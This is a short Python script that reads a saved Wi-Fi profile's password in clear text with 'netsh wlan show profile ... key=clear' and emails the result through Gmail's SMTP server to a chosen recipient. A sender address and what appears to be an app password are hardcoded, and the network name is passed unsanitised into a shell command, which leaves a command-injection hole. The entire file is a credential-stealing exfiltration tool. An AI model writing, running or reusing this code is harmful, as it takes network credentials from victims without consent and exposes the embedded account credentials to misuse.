import subprocess
import smtplib

def start(resiver, network_name):
    def get_mail(mail, password, r_mail, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, r_mail, message)
        server.quit()

    command = f"netsh wlan show profile {network_name} key=clear"
    result = subprocess.check_output(command, shell=True)
    get_mail("nunknow21@gmail.com", "nlbcckoizhyayonh", resiver, result)